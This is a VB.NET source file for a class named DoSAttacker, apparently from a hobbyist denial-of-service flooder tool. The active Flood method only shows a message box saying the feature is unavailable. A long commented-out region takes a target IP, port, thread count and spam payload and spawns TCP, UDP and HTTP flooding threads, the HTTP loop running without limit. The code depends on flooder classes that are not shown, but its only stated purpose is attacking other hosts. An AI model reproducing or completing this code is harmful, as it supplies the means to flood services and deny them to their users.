Imports System
Imports System.Collections.Generic
Imports System.Linq
Imports System.Text
Imports System.Net
Imports System.Windows.Forms
'Imports DCSFlooder
'Imports DCSFlooder.Flooder
'Imports DCSFlooder.HTTPFlooder
'Imports DCSFlooder.XXPFlooder
Imports DCS_Multi_DLL

Public Class DoSAttacker
    'Protected ReadOnly FAK As Long = 2738949656734840873
    Public Sub Flood(ByVal Protocol As Int32, ByVal AttackIP As String, ByVal AttackPort As Int32, ByVal Work As Boolean, ByVal Threads As Int32, ByVal SpamData As String, ByVal Timeout As Int32, ByVal ShouldWait As Boolean, ByVal httpSubsite As String)
        'If IsAuthed() = True Then
        'Dim Flooder As New DCSFlooder.Flooder
        'Flooder.Flood(Convert.ToInt64(FAK), Protocol, AttackIP, AttackPort, Work, Threads, SpamData, Timeout, ShouldWait, httpSubsite)
        'Else
        'End If
        MessageBox.Show("Slow down! This function isnt available in this version, Sorry", "Woah There!")
    End Sub
#Region "NOT WORKING"
    ''Private Shared xxp() As XXPFlooder
    'Private Shared http() As HTTPFlooder
    'Public sIP As String, sData As String, sSubsite As String 'sMethod
    'Public iPort, iThreads As Int32, iProtocol As Int32, iDelay As Int32, iTimeout As Int32 'iProtocol
    'Public bResp As Boolean, intShowStats As Boolean
    'Public KWorking As Boolean = True

    'Public Sub ATTACK(ByVal Protocol As Int32, ByVal AttackIP As String, ByVal AttackPort As Int32, ByVal Work As Boolean, ByVal Threads As Int32, ByVal SpamData As String, ByVal Timeout As Int32, ByVal ShouldWait As Boolean, ByVal httpSubsite As String)

    '    'if (cmdAttack.Text == "IMMA CHARGIN MAH LAZER")
    '    'If (Work = True) Then
    '    Try
    '        'try { iPort = Convert.ToInt32(txtPort.Text); }
    '        Try
    '            iPort = AttackPort
    '        Catch ex As System.Exception
    '            Throw New Exception("Invalid Attack Port")
    '        End Try
    '        'try { iThreads = Convert.ToInt32(txtThreads.Text); }
    '        Try
    '            iThreads = Threads
    '        Catch ex As System.Exception
    '            Throw New Exception("Invalid Thread Number")
    '        End Try
    '        'sIP = txtTarget.Text;
    '        sIP = AttackIP
    '        If (String.IsNullOrEmpty(sIP) OrElse String.Equals(sIP, "N O N E !")) Then
    '            Throw New Exception("Invalid Target IP.")
    '        End If
    '        iProtocol = Protocol
    '        'sMethod = cbMethod.Text;
    '        'if (String.Equals(sMethod, "TCP")) iProtocol = 1;
    '        'if (String.Equals(sMethod, "UDP")) iProtocol = 2;
    '        'if (String.Equals(sMethod, "HTTP")) iProtocol = 3;
    '        'if (iProtocol == 0)
    '        'throw new Exception("Select a proper attack method.");
    '        'sData = txtData.Text.Replace("\\r", "\r").Replace("\\n", "\n");
    '        sData = SpamData.Replace("\" & vbCr, "" & vbCr).Replace("\" & vbLf, "" & vbLf)
    '        If (String.IsNullOrEmpty(sData) _
    '                    AndAlso ((iProtocol = 1) _
    '                    OrElse (iProtocol = 2))) Then
    '            Throw New Exception("Invalid Spam Message (Using P1/P2)")
    '        End If
    '        sSubsite = httpSubsite
    '        If (Not sSubsite.StartsWith("/") _
    '                    AndAlso (iProtocol = 3)) Then
    '            Throw New Exception("Invalid HTTP Subsite (Using P3)")
    '        End If
    '        Try
    '            iTimeout = Timeout
    '        Catch ex As System.Exception
    '            Throw New Exception("Invalid Timeout")
    '        End Try
    '        'bResp = chkResp.Checked;
    '        bResp = ShouldWait
    '    Catch ex As Exception
    '        'frmWtf.Show()
    '        MessageBox.Show(ex.Message, "What the shit.")
    '        Return
    '    End Try
    '    'cmdAttack.Text = "Stop flooding";
    '    'if (String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
    '    If ((iProtocol = 1) _
    '                OrElse (iProtocol = 2)) Then
    '        Dim a As Integer = 0
    '        Do While (a < Threads)
    '            'Do While KWorking = True
    '            Dim xxp As New XXPFlooder(sIP, iPort, iProtocol, iDelay, bResp, sData)
    '            xxp.Start()
    '            a = (a + 1)
    '        Loop
    '    End If
    '    'if (String.Equals(sMethod, "TCP"))
    '    If (iProtocol = 3) Then
    '        Dim a As Integer = 0
    '        'Do While (a < http.Length)
    '        Do While KWorking = True
    '            http(a) = New HTTPFlooder(sIP, iPort, sSubsite, bResp, iDelay, iTimeout)
    '            http(a).Start()
    '            a = (a + 1)
    '        Loop
    '    End If
    '    'tShowStats.Start();
    '    'Else
    '    ''cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
    '    'If (Not (xxp) Is Nothing) Then
    '    '    Dim a As Integer = 0
    '    '    Do While (a < xxp.Length)
    '    '        xxp(a).IsFlooding = False
    '    '        a = (a + 1)
    '    '    Loop
    '    'End If
    '    'If (Not (http) Is Nothing) Then
    '    '    Dim a As Integer = 0
    '    '    Do While (a < http.Length)
    '    '        http(a).IsFlooding = False
    '    '        a = (a + 1)
    '    '    Loop
    '    'End If
    '    ''tShowStats.Stop();
    '    'End If
    'End Sub
#End Region
End Class